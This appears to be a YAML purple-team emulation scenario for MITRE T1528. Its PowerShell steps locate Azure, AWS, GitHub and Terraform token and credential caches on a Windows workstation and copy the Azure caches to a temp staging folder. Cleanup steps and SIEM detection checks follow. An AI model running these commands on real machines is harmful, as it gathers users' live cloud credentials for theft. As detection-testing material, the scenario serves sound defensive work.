id: T1528_steal_application_access_token
name: "Steal Application Access Token"
mitre_technique: "T1528"
mitre_tactic: "credential_access"
description: >
  Adversaries steal OAuth access tokens or service principal credentials to
  authenticate to cloud services and APIs. Tokens are stored on disk in MSAL cache
  files, Azure CLI token caches, and browser storage. Unlike passwords, tokens
  often have broad permissions and long lifetimes. An adversary with access to a
  developer workstation can steal tokens for Azure, GitHub, AWS, and all connected
  services without knowing any passwords. Token theft is the primary attack surface
  for cloud credential compromise in modern environments.
author: stanleytobias
created: "2026-01-01"
platform: windows
references:
  - https://attack.mitre.org/techniques/T1528/

steps:
  - step: 1
    type: marker
    description: "Pre-execution context"
    message: "Starting T1528 — Application Access Token theft simulation"

  - step: 2
    type: exec_powershell
    description: "Locate OAuth token caches on disk — identify theft targets"
    command: |
      Write-Host "[PAS] OAuth token cache locations:"
      $tokenPaths = @{
          "Azure CLI"              = "$env:USERPROFILE\.azure\msal_token_cache.json"
          "Azure CLI (legacy)"     = "$env:USERPROFILE\.azure\accessTokens.json"
          "Azure PowerShell"       = "$env:USERPROFILE\.azure\AzureRmContext.json"
          "MSAL shared cache"      = "$env:LOCALAPPDATA\.IdentityService\msal.cache"
          "VS Code Azure"          = "$env:APPDATA\Code\User\globalStorage\ms-vscode.azure-account"
          "Terraform"              = "$env:APPDATA\terraform.d\credentials.tfrc.json"
          "GitHub CLI"             = "$env:APPDATA\GitHub CLI\hosts.yml"
          "AWS CLI"                = "$env:USERPROFILE\.aws\credentials"
      }
      foreach ($name in $tokenPaths.Keys) {
          $p = $tokenPaths[$name]
          if (Test-Path $p) {
              $size = (Get-Item $p).Length
              Write-Host "  FOUND [$([Math]::Round($size/1KB,1)) KB]: $name -> $p"
          }
      }

  - step: 3
    type: exec_powershell
    description: "Copy token caches to staging — demonstrates theft artefact"
    command: |
      $stagingDir = "$env:TEMP\PAS_T1528_tokens"
      New-Item -ItemType Directory $stagingDir -Force | Out-Null

      $azureCli = "$env:USERPROFILE\.azure\msal_token_cache.json"
      $azureLeg  = "$env:USERPROFILE\.azure\accessTokens.json"
      foreach ($p in @($azureCli, $azureLeg)) {
          if (Test-Path $p) {
              Copy-Item $p $stagingDir -Force -ErrorAction SilentlyContinue
              Write-Host "[PAS] Staged: $([IO.Path]::GetFileName($p))"
          }
      }

      # Check for active az CLI login
      $azCmd = Get-Command az -ErrorAction SilentlyContinue
      if ($azCmd) {
          Write-Host "[PAS] Azure CLI installed — token available for theft"
          Write-Host "[PAS] Real attack: copy msal_token_cache.json to attacker machine, inject into az context"
      }

  - step: 4
    type: sleep
    description: "Allow telemetry to flush"
    seconds: 3

  - step: 5
    type: marker
    description: "Post-execution prompt"
    message: "Check SIEM — msal_token_cache.json / accessTokens.json accessed by non-az/non-VS process"

cleanup:
  - step: 1
    type: exec_powershell
    description: "Remove token staging directory"
    command: |
      Remove-Item "$env:TEMP\PAS_T1528_tokens" -Recurse -Force -ErrorAction SilentlyContinue
      Write-Host "[PAS][Cleanup] Token staging removed"

  - step: 2
    type: marker
    description: "Cleanup complete"
    message: "T1528 cleanup complete"

analyst_checklist:
  - "File event: msal_token_cache.json or accessTokens.json accessed by non-developer-tool process"
  - "File event: .aws/credentials or terraform credentials accessed by powershell.exe"
  - "Sentinel: DeviceFileEvents | where FileName in ('msal_token_cache.json','accessTokens.json') and InitiatingProcessFileName == 'powershell.exe'"
  - "Entra ID: token used from new IP/device shortly after being accessed from developer machine"
  - "CONTROL CHECK: Token lifetime — short-lived tokens (1hr) limit replay window; use Continuous Access Evaluation"
  - "CONTROL CHECK: Workload Identity Federation instead of client secrets — tokens tied to GitHub Actions workflow, not portable"
  - "CONTROL CHECK: MDE file access monitoring on token cache paths — developer workstations are high-value targets"
